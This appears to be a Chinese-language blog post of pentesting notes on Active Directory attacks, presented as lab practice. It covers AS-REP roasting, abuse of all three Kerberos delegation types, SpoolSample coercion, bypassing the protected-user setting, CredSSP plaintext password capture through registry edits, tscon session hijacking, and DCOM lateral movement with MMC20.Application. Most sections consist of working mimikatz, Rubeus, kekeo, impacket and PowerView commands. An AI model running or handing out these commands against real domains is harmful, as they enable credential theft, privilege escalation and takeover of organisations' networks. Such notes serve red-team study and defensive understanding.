<p>使用Empire框架下的powerview.ps1查找域中设置了 “不需要kerberos预身份验证” 的用户</p>
<pre><code class="language-纯文本">Import-Module .\powerview.ps1
 Get-DomainUser -PreauthNotRequired
</code></pre>
<p><img alt="QQ截图20210217132707" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217132707.png" title="QQ截图20210217132707" /></p>
<p>然后用 ASREPRoast.ps1 ：</p>
<p><a href="https://github.com/HarmJ0y/ASREPRoast" title="https://github.com/HarmJ0y/ASREPRoast">https://github.com/HarmJ0y/ASREPRoast</a></p>
<p>&#x20;获取指定用户的AS-REPhash</p>
<pre><code class="language-纯文本">Import-Module ASREPRoast.ps1
Get-ASREPHash -USER xx -Domain xx |Out-file -Encoding ASCII hash.txt
</code></pre>
<p>就会生成一个hash数据文件了</p>
<h3 id="how-to-crack-hash_1">How to crack hash</h3>
<p>将生成的HASH保存起来，并在下图处加入\$23</p>
<p><img alt="QQ截图20210217132743" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217132743.png" title="QQ截图20210217132743" /></p>
<p>然后丢给hashcat 跑</p>
<pre><code class="language-纯文本">hashcat -m 18200 hash.txt pass.txt
</code></pre>
<p>注意这里的pass.txt是自己的明文字典…之前我还一直以为是爆破出来的结果.
原来是一个一个的用明文字典去爆破。</p>
<h2 id="_3">委派攻击</h2>
<h3 id="_4">域委派</h3>
<p>域委派是一种域内主机的行为，使某个服务可以以访问的用户的身份去访问另外一个服务。
为什么需要域委派呢，比如现在有web服务器和文件服务器，当用户A访问web服务器去请求某个资源时，web服务器上本身并没有该资源，所以web服务器就会从文件服务器上调用这个资源，其中发生的过程若以域委派的形式进行，那么就是：
用户A访问web服务器，服务器再以用户A的身份去访问文件服务器。
发生域委派的服务一般为机器账户和服务账户。
域委派分为三种：非约束性委派，约束性委派，基于资源的约束性委派</p>
<h4 id="_5">非约束性委派</h4>
<p>非约束性委派的原理是：用户想访问服务A，于是向KDC提交认证，KDC发现A是非约束性委派，于是会把TGT放在ST中一并给用户。然后用户用这个ST去访问服务A，服务A就相当于获得了用户的TGT，把TGT放入lsass进程，然后就可以拿着用户的TGT以用户的身份去访问所有用户权限能够访问的服务了。</p>
<p>非约束性委派的启用：</p>
<p><img alt="QQ截图20210217134709" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217134709.png" title="QQ截图20210217134709" /></p>
<p>为某账户启用 信任此计算机来委派任何服务 即开启非约束性委派。
开启后在该用户的 ACL属性会多出一个 flag : WORKSTATION_TRUSTED_FOR_DELEGATION (图截不完，反正这个flag就在箭头所指处的后面)</p>
<p><img alt="QQ截图20210217134749" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217134749.png" title="QQ截图20210217134749" /></p>
<p>非约束委派的设置需要<code>SeEnableDelegation</code> 特权，该特权通常仅授予域管理员
这里说个题外话，域控主机默认是非约束性委派</p>
<h4 id="_6">约束性委派</h4>
<p>非约束性委派是很不安全的（因为控制了开启非约束性委派的机器，就相当于获得了上面的所有其他用户的TGT），所以更安全的约束性委派诞生了。
约束性委派多了两个委派协议，S4U2SELF S4U2PROXY，并且限制了被设置委派的服务的访问范围：仅能被委派到被指定的服务。</p>
<p>约束性委派的大致流程：
用户访问开启约束性委派的服务A
（情况一：无S4U2SELF参与）首先需要经过KDC认证，KDC发现服务A开启了约束性委派，于是在TGS_RES返回给用户ST1（可转发ST），用户拿着ST1访问服务A，服务A先与KDC进行身份验证获得一个有效TGT，然后拿着ST1经过S4U2PROXY协议向KDC发起TGS_REQ，KDC返回ST2（用户身份的ST），然后服务A拿着ST2访问指定服务。
（情况二：有S4U2SELF参与）用户通过其他方式（如NTLM认证，表单认证等）获取了服务A的信任，但是此时服务A并没有来自用户的ST1，按情况一中的流程，服务A就不能完成委派。所以这个时候服务A会以自己的身份向KDC发起申请获取一个可转发TGT（获取KDC信任），然后用这个TGT发起TGS_REQ获得指定用户的ST1，既然获取了ST1，就继续情况一中的流程即可了。</p>
<p>也就是说S4U2SELF是用户通过非kerberos协议完成认证的情况下，自动向KDC获取ST1的一个协议。
而S4U2PROXY则是将ST1发给KDC，使其变现为成自己可用的 ST2 的一个协议。</p>
<p>启用方法:</p>
<p><img alt="QQ截图20210217135048" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217135048.png" title="QQ截图20210217135048" /></p>
<p>其中被添加的服务则是允许被委派到的服务</p>
<p>若启用的是 仅使用kerberos，那么useraccountcontrol属性仅有 workstation_trust_account.
若启用任何身份验证协议，就会有 TrustedToAuthenticationForDelegation</p>
<p><img alt="QQ截图20210217135100" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217135100.png" title="QQ截图20210217135100" /></p>
<h4 id="_7">基于资源的约束性委派</h4>
<p>Windows Server 2012中引入了基于资源的约束性委派。 只能在运行Windows Server 2012或Windows Server 2012 R2及以上的域控制器上配置
基于资源的约束性委派，不需要域管理员前来设置，而把设置委派的权限交给了自身。
其实就是可以摆脱域控来主动设置自己可以被哪些账户委派访问。</p>
<h3 id="_8">非约束性委派攻击</h3>
<p>非约束性委派有巨大的安全问题，上面我们说过，非约束性委派的实质就是把用户的TGT存入lassa进程，从而模拟用户身份进行各种委派访问，所以我们只需控制非约束性委派攻击的机器，然后dump出所有的票据，就相当于获得了所有经过该服务进行约束性委派的用户的身份了。</p>
<h4 id="1">1.进行非约束性委派账户扫描</h4>
<p>这里提一下怎么创建有SPN的服务账户。
只需再域控里执行 setspn -U -A spn_type username 即可
其中spn_type即SPN的格式： MSSQLSvc/:[ | ]</p>
<ul>
<li><strong>MSSQLSvc</strong> 是要注册的服务。</li>
<li>&#x20;是服务器的完全限定域名。</li>
<li>&#x20;是 TCP 端口号。</li>
<li>&#x20;是 SQL Server 实例的名称。</li>
</ul>
<p>这里我们随便输一个，比如 sb/caonima 这种都行.</p>
<p>这里采用powersploit下的powerview.ps1
根据我网上很多搜索结果，查找非约束委派服务账户只需调用
<code>Get-NetUser -Unconstrained -Domain de1ay.com</code></p>
<pre><code class="language-纯文本">Get-NetUser -Domain de1ay.com|? {$_.useraccountcontrl -like &quot;trusted_for_delegation&quot;}
</code></pre>
<p>这个命令即可，但是我下载下来的powerview里的get-netuser里却没有unconstrained参数，很烦。所以用一个比较原始的方法来判别（适合在用户少的情况下）
直接调用 Get-NetUser -SPN 找到所有服务账户或者Get-domaincomputer找到所有机器账户，然后判断其useraccountcontrl里有没有trusted_for_delegation,若有，则说明开启了非约束性委派</p>
<p><img alt="QQ截图20210217135123" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217135123.png" title="QQ截图20210217135123" /></p>
<p>查询非约束委派机器账户则用
<code>Get-domaincomputer -unconstrained -domain const.com</code></p>
<p><img alt="QQ截图20210217135236" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217135236.png" title="QQ截图20210217135236" /></p>
<h4 id="2">2.非约束性委派的攻击</h4>
<p>仅能基于机器账户</p>
<p>如果我们获得了一个非约束性委派账户，我们就可以通过收集内存中的tgt达到任意用户访问的目的。</p>
<p>在被控制的非约束性委派机器上使用mimikatz。
<code>privilege::debug</code>提权
<code>sekurlsa::tickets</code> 查看本机所有票据</p>
<p>通过以上命令获取票据,如果管理员访问了本机的一些服务，那么它的TGT就会被截获放入内存。</p>
<p>我们模拟管理员调用非约束性委派机的smb服务</p>
<p><img alt="QQ截图20210217135342" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217135342.png" title="QQ截图20210217135342" /></p>
<p>我们回到非约束委派机，查看票据</p>
<p><img alt="QQ截图20210217135358" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217135358.png" title="QQ截图20210217135358" /></p>
<p>tgt被截获,我们用 sekurlas::tickets /export 把票据导出来</p>
<p><img alt="QQ截图20210217135408" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217135408.png" title="QQ截图20210217135408" /></p>
<p>然后mimikatz里使用
<code>kerberos::ptt 票据文件名 将票据注入内存</code>
访问域控c\$</p>
<p><img alt="QQ截图20210217135419" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217135419.png" title="QQ截图20210217135419" /></p>
<p>成功</p>
<h4 id="3-spooler">3.非约束性委派配合 Spooler打印机服务</h4>
<p>纯非约束性委派攻击很鸡肋，因为必须要其他用户通过你进行委派访问。
但是 ：利用Windows打印系统远程协议<code>（MS-RPRN）</code>中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用MS-RPRN <code>RpcRemoteFindFirstPrinterChangeNotification（Ex）</code>方法强制任何运行了<code>Spooler</code>服务的计算机以通过<code>Kerberos</code>或<code>NTLM</code>对攻击者选择的目标进行身份验证。 配合非约束性委派攻击，简直爆炸，可以主动拿到其他用户的TGT。-
而且splooer服务是默认运行的。（图源WIN7）</p>
<p><img alt="QQ截图20210217135445" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217135445.png" title="QQ截图20210217135445" /></p>
<p>使其他主机强行与自己发生身份验证的脚本：需要自己编译一下<a href="https://github.com/leechristensen/SpoolSample.git" title="https://github.com/leechristensen/SpoolSample.git">https://github.com/leechristensen/SpoolSample.git</a></p>
<p>在此之前需要开启监听来自其他主机的TGT，这里用的是rubeus
<code>Rubeus.exe monitor /interval:1 /filteruser:xx</code></p>
<p>然后使用<code>SpoolSample.exe XX win7</code>,让指定机器访问WIN7进行身份验证</p>
<p>然后获得TGT，下班。</p>
<h3 id="_9">约束性委派的攻击</h3>
<p>约束性委派的大致攻击流程是: (利用S4U2SELF=&gt;)如果我们获得了约束性委派机的NTLM hash或者明文密码，我们就可以以此来向KDC发送一个TGT申请，获得一个可转发的TGT。然后用这个可转发的TGT调用S4U2SELF协议，获得一个针对自己的ST1票据（其中ST1票据中的请求用户可以任意伪造）.然后用这个ST1票据去向KDC请求ST2，然后用ST2去访问服务，此时我们访问的身份就是我们任意伪造的身份了.</p>
<p>重点是只要获得了可转发TGT，约束性委派机就可以任意伪造其他用户的ST1票据请求，太可怕了。</p>
<p>这个攻击的最大前提是我们得获得约束性委派账户的NTLM HASH或者明文密码,然后我们才能成功的得到可转发TGT，然后才能得到接下来的一切。</p>
<p>首先配置好约束性委派账户</p>
<p><img alt="QQ截图20210217135527" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217135527.png" title="QQ截图20210217135527" /></p>
<p>注意选用 使用任何身份验证协议</p>
<p>我们先信息搜集：看哪些用户是开启约束性委派的。一手powerview安排上</p>
<p><img alt="QQ截图20210217135553" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217135553.png" title="QQ截图20210217135553" /></p>
<p>箭头指出的地方就是可以被委派访问的服务</p>
<p>我们用kekeo来实现攻击.</p>
<pre><code class="language-纯文本">tgt::ask /user:xx /domain:xx /password:xx /ticket:test.kirbi这里的/password可以改成/NTLM:xx
获得TGT转发票据

tgs::s4u /tgt:file_name /user:administrator /service:cifs/DC
tgt处改为刚刚得到的TGT文件的名字，这个命令执行后得到administrator身份的 ST2
</code></pre>
<p>把最后获得的票据用mimikatz kerberos::ptt 注入内存，完事。</p>
<h3 id="_10">基于资源的约束性委派</h3>
<p>refer:<a href="https://xz.aliyun.com/t/7454" title="https://xz.aliyun.com/t/7454">https://xz.aliyun.com/t/7454</a></p>
<p><a href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd" title="https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd">https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd</a></p>
<p>实用场景：1.提权 2.一些情况下不能直接通过凭据远控pc，通过此方法曲线救国。</p>
<p>前提：有一个用户对一个机器有genericAll，WriteAccountRestrictions等权限</p>
<h4 id="_11">原理的几个点：</h4>
<p>1.S4U2SELF 协议可以在用户没有配置 TrustedToAuthenticationForDelegation 属性（即开启使用任何协议认证的约束性委派）时被调用，但是返回的ST是不可被转发的。
2.基于资源的约束性委派主机 在被另一台主机委派访问时，在S4U2PROXY过程中提交过来的ST如果即使是不可转发的。KDC依旧会返回有效的ST2。
3.每个普通域用户默认可以创建至多十个机器账户（ 由MachineAccountQuota属性决定 ），每个机器账户被创建时都会自动注册SPN: <code>RestrictedKrbHost/domain</code>和<code>HOST/domain</code>这两个SPN</p>
<h4 id="_12">攻击流程:</h4>
<p>假设开启基于资源的约束性委派机器为A
1.首先要有一个对当前计算机有写权限的账户，才能对A设置可以 被 委派访问的服务账户。
2.利用当前账户创建一个机器账户，并配置好机器账户到A的 基于资源的约束性委派
3.因为机器账户是我们创建的，我们知道他的密码账户，可以让它利用S4U2SELF协议获得一个不可转发ST。然后用这个不可转发ST通过S4U2PROXY，在基于资源的约束性委派基础上获得有效的访问A cifs服务的ST2。
4.用ST2访问A的CIFS服务，权限获得。</p>
<h4 id="_13">实操</h4>
<p><strong>1.rebeus</strong></p>
<p>这个攻击说白了就是个提权...</p>
<p>首先我们检查一下域控是否是win2012以上的主机，因为只有这样才能开启 基于资源的约束性委派。</p>
<p>我们使用powersploit下的powerview脚本。执行命令 get-netdomaincontroller</p>
<p><img alt="QQ截图20210217135833" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217135833.png" title="QQ截图20210217135833" /></p>
<p>可以获得域控WIN版本</p>
<p>然后我们查看当前用户对哪台主机有写权限。因为是实验，所以我们先来看看怎么配置一个用户对一个机器的权限。
直接在域控上找到某主机，然后进入在属性里进入安全选项卡，添加某用户，然后给这个用户分配权限即可。</p>
<p><img alt="QQ截图20210217135859" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217135859.png" title="QQ截图20210217135859" /></p>
<p>我们依旧使用powerview。先调用
<code>Get-DomainUser -Identity username -Properties objectsid</code>来获取当前用户SID
然后<code>Get-DomainObjectAcl -Identity 主机名 | ?{$_.SecurityIdentifier -match "刚刚得到的SID"}</code> 查看当前用户对某台主机是否有写权限。</p>
<p><img alt="QQ截图20210217140628" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217140628.png" title="QQ截图20210217140628" /></p>
<p>如果有 GenericAll（完全控制权），GenericWrite、WriteProperty、WriteDacl 这些属性，就说明该用户能修改计算机的账户属性。
如图看到我们对WIN7进行操作</p>
<p>好的，我们接下来就要创立一个机器用户了。根据网上搜索结果，使用powermad这个ps脚本可以很快捷的创建一个机器用户。<a href="https://github.com/Kevin-Robertson/Powermad" title="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a></p>
<pre><code class="language-纯文本">Import-Module .\Powermad.ps1New-MachineAccount -MachineAccount hack;system -Password $(ConvertTo-SecureString &quot;hack&quot; -AsPlainText -Force)
</code></pre>
<p><img alt="QQ截图20210217140659" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217140659.png" title="QQ截图20210217140659" /></p>
<p>好的，我们添加了一个密码hack，名为hacksystem的机器账户，接下来就是配置hacksystem到WIN7的委派了。我们需要做的，是修改WIN7的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的值 ，这个操作我们用powerview实现。</p>
<pre><code class="language-纯文本">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3298638106-3321833000-1571791979-1112)&quot;  
#这儿的sid是我们创建的#机器用户#evilsystem的sid
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer WIN7| Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
</code></pre>
<p><img alt="QQ截图20210217140726" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217140726.png" title="QQ截图20210217140726" /></p>
<p>至于机器账户SID怎么获得，powerview下的 <code>get-domiancomputer hacksystem</code>
然后使用<code>Get-DomainComputer WIN7 -Properties msds-allowedtoactonbehalfofotheridentity</code> 查看委派是否设置成功</p>
<p><code>Set-DomainObject win7 -Clear 'msds-allowedtoactonbehalfofotheridentity' -Verbose</code>此命令可以清除 msds-allowedtoactonbehalfofotheridentity属性的值</p>
<p>现在都统统设置好了，开始下一步吧。
网上一般用的rubeus，这里我用kekeo吧</p>
<pre><code class="language-纯文本">Rubeus.exe hash /user:xxx /password:xxx /domain:xxx
</code></pre>
<p>本地运算出机器用户ntlm hash 这里借用一下别人的图</p>
<p><img alt="QQ截图20210217140944" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217140944.png" title="QQ截图20210217140944" /></p>
<p><code>Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</code> 写入票据</p>
<p>然后我在本机使用以上方法后klist一下，发现确实存在票据</p>
<p><img alt="QQ截图20210217140737" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217140737.png" title="QQ截图20210217140737" /></p>
<p>但是dir \test1\c\$时本机莫名其妙不能进行kerberos验证，我服了》。。但不管怎样，我们拿到银票了(这个笔记写于2021年，第一次实战遇到在2023年，还是遇到了类似的坑）</p>
<p><strong>2.impacket</strong></p>
<pre><code class="language-纯文本">加机器账户
./addcomputer.py -computer-name 'aa$' -computer-pass 'applem1@123' -dc-host dc.a.cn 'a.cn/testusername:testpassword'

将机器账户加入机器的msDS-AllowedToActOnBehalfOfOtherIdentity属性
./rbcd.py  rbcd.py -delegate-from 'weipai_test$' -delegate-to 'victimmachine$' -dc-ip '172.21.32.31' -action 'write' 'a.cn'/'testusername':'testpassword'

读一下机器账户的msDS-AllowedToActOnBehalfOfOtherIdentity属性看看写入成功没
./rbcd.py  -delegate-to 'victimmachine$' -dc-ip '172.21.32.31' -action 'read' 'a.cn'/'testusername':'testpassword'

拿st，然后注入内存即可
./getST.py -spn 'cifs/victimmachine' -impersonate Administrator -dc-ip 172.21.32.31 'a.cn'/'testusername':'testpassword'

export KRB5CCNAME=ad01.ccache

</code></pre>
<h4 id="_14">敏感用户不可委派的绕过</h4>
<p><img alt="QQ截图20210217141050" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217141050.png" title="QQ截图20210217141050" /></p>
<p>若我们的administrator用户被设置为敏感用户不可委派或者被加入保护组，按理说他的访问就不能进行委派。</p>
<p><strong>1.rebeus</strong></p>
<p>我们在以administrator账户身份进行S4U时，只能进行S4U2SELF，不能进行S4U2PROXY。我们用 <code>Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</code>继续实验administrator，发现确实是这样</p>
<p><img alt="QQ截图20210217141131" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217141131.png" title="QQ截图20210217141131" /></p>
<p>此时我们用 rubeus.exe describe /ticker:S4Ubase64 /ticket:加密的票据</p>
<p><img alt="QQ截图20210217141313" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217141313.png" title="QQ截图20210217141313" /></p>
<p>可以发现servicename并没有指定某个服务，仅仅只有一个账户.即发生了服务名称缺失的问题。很简单，把票据修改一下就行了.网上很多说用这个工具
<a href="https://www.pkisolutions.com/tools/asn1editor/" title="https://www.pkisolutions.com/tools/asn1editor/">https://www.pkisolutions.com/tools/asn1editor/</a>
但实际上rubeus也能完成票据修改<code>rubeus.exe tgssub /ticket:xxx /altservice:cifs/test1 /ptt</code></p>
<p><img alt="QQ截图20210217141325" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217141325.png" title="QQ截图20210217141325" /></p>
<p><img alt="QQ截图20210217141339" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217141339.png" title="QQ截图20210217141339" /></p>
<p>完事</p>
<p><strong>2.impacket</strong></p>
<p>在getST中加上<code>-force-forwardable</code>参数</p>
<pre><code class="language-纯文本">python3 getST.py redteam.lab/CPT04\$:Passw0rd -spn krbtgt -impersonate Administrator -dc-ip 10.10.2.20 -force-forwardable 

</code></pre>
<h2 id="credssp">credssp 导出用户明文密码</h2>
<p>CredSSP协议的目的是将用户的明文密码从CredSSP客户端委派给CredSSP服务器。 通常运用于远程桌面服务。</p>
<p>我们在配置这个协议时，一般在组策略编辑器里配置。</p>
<p><img alt="QQ截图20210217143231" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217143231.png" title="QQ截图20210217143231" /></p>
<p>Allow delegating default credentials表示在通过使用受信任的X509证书或Kerberos实现服务器身份验证时自动发送当前用户的凭据，即明文密码。</p>
<p>Allow delegating default credentials with NTLM-only server authentication表示在通过NTLM实现服务器身份验证时自动发送当前用户的凭据，即明文密码。</p>
<p>这几个属性在注册表里对应 HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation。</p>
<h3 id="_15">攻击原理</h3>
<p>那么这样看，这个攻击流程就很自然了。
我们要获得两台机器，一台机器当作远程桌面的服务器，一台当作远程桌面的客户端。
在客户端上配置组策略（CREDSSP），使其在远程桌面身份验证时发送明文密码。
然后开始远程桌面验证，在服务器上获得客户端发来的明文密码.</p>
<h3 id="_16">实操</h3>
<p>1.通过修改注册表，改变组策略身份验证的凭据策略(选一个），这一步需要管理员权限，本地或域管</p>
<pre><code class="language-纯文本">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /v AllowDefaultCredentials /t REG_DWORD /d 1

reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /v AllowDefCredentialsWhenNTLMOnly /t REG_DWORD /d 1

reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /v ConcatenateDefaults_AllowDefault /t REG_DWORD /d 1

reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /v ConcatenateDefaults_AllowDefNTLMOnly /t REG_DWORD /d 1

reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation\AllowDefaultCredentials /v 1 /t REG_SZ /d *

reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation\AllowDefCredentialsWhenNTLMOnly /v 1 /t REG_SZ /d *
</code></pre>
<p>一股脑设置好就完事了。。（用户需重新登陆才生效）</p>
<p>然后开始获取密码</p>
<p>我们刚刚提到需要两台电脑才能获取密码，其实那只是一个模型，一个机器既可以当作客户端又可以当作服务端的。
我们用kekeo实现攻击（本机向本机获取密码时，普通用户即可完成以下操作）</p>
<pre><code class="language-纯文本">tsssp::server 开启服务端
tsssp::client /target:...   开启客户端，这里的target随便填
</code></pre>
<p><img alt="QQ截图20210217143306" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217143306.png" title="QQ截图20210217143306" /></p>
<p>那么再回到需要两个机器，一个当服务端一个当客户端的情况吧。</p>
<p>服务端建立: tsssp::server 需要SYSTEM权限</p>
<p>客户端链接: tsssp::client /target:服务端的SPN（一般采用TERMSRV服务） /pipe: \服务端域名\pipe\kekeo_tsssp_endpoint 普通用户权限即可</p>
<p><img alt="QQ截图20210217143322" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217143322.png" title="QQ截图20210217143322" /></p>
<h2 id="tscon">tscon横向</h2>
<p>若一个机器上有多个用户登录，则在任务管理器可以看见如下场面</p>
<p><img alt="QQ截图20210217143439" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217143439.png" title="QQ截图20210217143439" /></p>
<p>其中，我们可以右键其他用户选择链接，输入其密码后就能进入其桌面</p>
<p><img alt="QQ截图20210217143500" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217143500.png" title="QQ截图20210217143500" /></p>
<p>但是对于system用户来说，要链接到其他用户是不需要输入密码的，可以直接连接。所以我们可以通过system权限获取登录在当前机器上的域用户权限。
比如上图中的administrator是域管，我有当前机器的system权限，那么我可以直接用以下命令完成用户权限获得。</p>
<p>query user 获得administrator用户的id</p>
<p><img alt="QQ截图20210217143547" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217143547.png" title="QQ截图20210217143547" /></p>
<p>可以发现admin的id是2，那么我们就可以用tscon这个windows自带的命令行工具完成权限获得。</p>
<p>cmd /k tscon 2 /dest:console</p>
<p>执行以上命令，我们跳转到了admin的桌面</p>
<p><img alt="QQ截图20210217143616" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217143616.png" title="QQ截图20210217143616" /></p>
<h2 id="comdcom">利用COM/DCOM对象</h2>
<p>参考:<a href="https://www.freebuf.com/articles/network/256372.html" title="https://www.freebuf.com/articles/network/256372.html">https://www.freebuf.com/articles/network/256372.html</a></p>
<h3 id="_17">前言</h3>
<p>DCOM是COM的扩展，允许应用程序实例化和访问远程计算机上的COM对象。
这里简要说一下几个有关COM的概念</p>
<p>CLSID：又叫CLASSID 一个COM类的唯一标识符，每一个Windows注册类与一个CLSID相关联。长得像这样 {20D04FE0-3AEA-1069-A2D8-08002B30309D}</p>
<p>ProgID：其可被用作对用户更友好的替代的一个CLSID，比如MMC20.APPLICATION.1就是一个ProgID。ProgID不能保证是唯一的，并非每个类都与ProgID相关联</p>
<p>Appid: 为了保证COM对象能被顺利的远程调用（即为了使DCOM可访问COM对象），需要把APPID与该类的CLSID相关联，且AppID需设置权限来规划哪些客户端能够访问</p>
<p>我们可以通过powershell执行get-CimInstance 来列出本地COM程序列表</p>
<p><img alt="image-20210223152713449" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210223152713449.png" title="image-20210223152713449" /></p>
<p>远程DCOM对象实例化的流程:</p>
<pre><code class="language-纯文本">客户端从远程计算机请求实例化由CLSID表示的对象。如果客户端使用ProgID则先将其本地解析为CLSID。
远程计算机检查是否存在由该CLSID所关联的AppID，并验证客户端的权限。
DCOMLaunch服务将创建所请求的类的实例，通常是通过运行LocalServer32子项的可执行文件，或者通过创建DllHost进程来承载InProcServer32子项引用的dll。
客户端应用程序和服务器进程间建立通信，客户端便可以访问新创建的对象。
</code></pre>
<h3 id="mmc20application1">MMC20.APPLICATION.1</h3>
<p>中文名为： Microsoft管理控制台（MMC）2.0包括脚本对象模型。 我们一步步抽丝剥茧跟踪一下这个对象的利用点，需要注意的一点是调用该对象必须要有管理员权限。</p>
<p><img alt="image-20210223161553486" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210223161553486.png" title="image-20210223161553486" /></p>
<p><img alt="image-20210223160909543" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210223160909543.png" title="image-20210223160909543" /></p>
<p>如上图，我们先列出在MMC20.APPLICATION中的模块，然后继续列出其中Document中的属性，再继续列出Document.ActiveView中的属性。可以发现一个名为ExecuteShellCommand的方法，光是听名字就知道是可以执行shell命令的方法了。到微软文档查一查这个方法，获得了以下信息。</p>
<pre><code class="language-纯文本">ExecuteShellCommand（[命令][目录][叁数][窗口状态]）
命令
一个值，指定要执行的命令。可以指定标准路径。Command中包含的所有环境变量（例如“％windir％”）都将被扩展。

目录
一个值，用于指定工作目录的名称。Directory中包含的所有环境变量都将被扩展。如果“目录”为空字符串，则将当前目录用作工作目录。

参数
一个指定Command要使用的参数（如果有）的值；参数必须用空格分隔。例如，将参数指定为“ Param1 Param2”会导致Command接收Param1和Param2作为参数。如果要求单个参数用双引号引起来，请使用适合您的编程语言的技术。例如，在Microsoft Visual Basic中，将参数指定为“ Param1”“这是Param2”“”导致命令接收到参数1和“这是Param2”。

窗口状态
一个指定窗口状态的值。该值可以是以下字符串值之一，也可以是空字符串。如果为空字符串，则默认为“已恢复”。

“Maximized”
该命令在最大化的窗口中执行。

“Minimized”
该命令在最小化的窗口中执行。

“Restored”
该命令在已恢复或正常的窗口中执行。注意：这里会弹个黑框框

返回值
此方法不返回值。
</code></pre>
<p>于是乎，我们就能理所应当的想到这个东西可以被用于本地任意命令执行，就像这样</p>
<pre><code class="language-纯文本">[activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.application')).Document.ActiveView.Executeshellcommand('cmd.exe',$null,'/c calc.exe','Restored') 
</code></pre>
<p><img alt="image-20210223161252812" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210223161252812.png" title="image-20210223161252812" /></p>
<p>我们进一步发掘其横向移动的能力</p>
<p>我们知道DCOM具有通过网络与对象进行交互的能力，在我们是管理员的前提下我们可以使用GetTypeFromProgID()与powershell进行DCOM远程交互。
GetTypeFromProgID("COM","远程ip") 即可指定与哪一个远程IP进行交互。所以我们可以把payload改造成这样，进而可以在其他机器上进行任意命令执行，从而达到横向移动的目的</p>
<pre><code class="language-纯文本">[activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.application' ，'远程ip')).Document.ActiveView.Executeshellcommand('cmd.exe',$null,'/c calc.exe','Restored')
</code></pre>
<h2 id="ipc">ipc</h2>
<h3 id="ipc_1">ipc简介</h3>
<p>IPC$是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，即能建立链接，达到访问远程计算机的目的。ipc共享连接成功后一般能共享所有共享盘符。（也就是IPC连接后可以远程共享C$,D\$等）</p>
<p>利用这个链接不仅可以访问目标机器中的文件，进行上传下载等操作，还能在目标机器上执行部分命令。</p>
<pre><code class="language-纯文本">net use \\ip\ipc$ &quot;password&quot; /user:username
</code></pre>
<p>如果账户和口令正确，就建立好了链接。</p>
<p>建立好链接后就能执行以下命令</p>
<pre><code class="language-纯文本">dir \\192.168.183.130\c$ 列出C盘
